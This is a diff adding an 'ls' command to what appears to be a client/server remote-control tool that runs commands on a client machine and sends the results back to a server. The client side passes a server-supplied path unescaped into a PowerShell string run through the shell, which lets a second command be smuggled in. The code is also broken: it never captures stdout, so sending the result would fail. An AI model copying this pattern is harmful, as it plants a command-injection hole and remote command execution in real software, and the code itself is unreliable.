@@ -1191,3 +1191,56 @@ class OpenURL(DoubleCommand):
 
         print("Opened url on client")
         return CommandResult(DoubleCommandResult.success)
+
+
+@add_double_command(
+    "ls",
+    "ls [ directory ]",
+    "Lists a directory on the client",
+    [ArgumentType.string],
+    EmptyReturn,
+    max_selected=1,
+)
+class ListDirectory(DoubleCommand):
+    @staticmethod
+    def client_side(sock: socket.socket) -> None:
+        import subprocess
+
+        tmp_sock = sock.dup()
+        tmp_sock.setblocking(True)
+        tmp_sock.settimeout(5)
+
+        try:
+            path = tmp_sock.recv(int.from_bytes(tmp_sock.recv(8))).decode(
+                "ascii", "ignore"
+            )
+        except OSError:
+            return
+
+        proc = subprocess.Popen(f"powershell -c 'dir {path}'", shell=True)
+        proc.wait()
+        stdout, stderr = proc.communicate()
+        try:
+            tmp_sock.sendall(len(stdout).to_bytes(8))
+            tmp_sock.sendall(stdout)
+        except OSError:
+            return
+
+    @staticmethod
+    def server_side(client: "Client", params: tuple) -> CommandResult:
+        tmp_sock = client.create_temp_socket(True, 5)
+
+        try:
+            tmp_sock.sendall(len(params[0]).to_bytes(8))
+            tmp_sock.sendall(params[0].encode("ascii"))
+        except OSError:
+            print("Failed to send path to client")
+            return CommandResult(DoubleCommandResult.conn_error)
+
+        try:
+            stdout = tmp_sock.recv(int.from_bytes(tmp_sock.recv(8)))
+            print(stdout)
+        except (OSError, MemoryError):
+            print(f"Error recieving items in {params[0]}")
+            return CommandResult(DoubleCommandResult.failure)
+        return CommandResult(DoubleCommandResult.success, stdout)
